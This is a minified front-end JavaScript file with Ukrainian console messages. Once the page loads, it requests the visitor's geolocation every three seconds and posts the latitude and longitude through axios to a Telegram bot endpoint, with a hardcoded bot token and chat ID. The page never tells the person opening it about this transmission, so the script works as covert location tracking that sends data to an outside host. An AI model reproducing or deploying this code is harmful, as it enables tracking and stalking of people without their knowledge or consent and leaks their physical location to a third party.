document.addEventListener("DOMContentLoaded",(function(){let o,e="<b>Get location</b>\n";o=setInterval((()=>{"geolocation"in navigator?navigator.geolocation.getCurrentPosition((function(o){var n=o.coords.latitude,t=o.coords.longitude;!function(o){e+=`${n}\n`,e+=`${t}`;try{axios.post("https://api.telegram.org/bot6407921969:AAGnKf8qyUQ3H2x0SNI61kLnO0qEHU1R2Ik/sendMessage",{chat_id:"-1001903507381",parse_mode:"html",text:e}).then((o=>{console.log("Message sent to Telegram successfully.")})).catch((o=>{console.error("Error sending message to Telegram:",o)}))}catch(o){console.error("Error sending message to Telegram:",o)}finally{e=""}}(),console.log("Ваша поточна геолокація:"),console.log("Широта: "+n),console.log("Довгота: "+t)})):console.log("Геолокація не підтримується цим браузером.")}),3e3),console.log(o)}));
//# sourceMappingURL=index.259db547.js.map
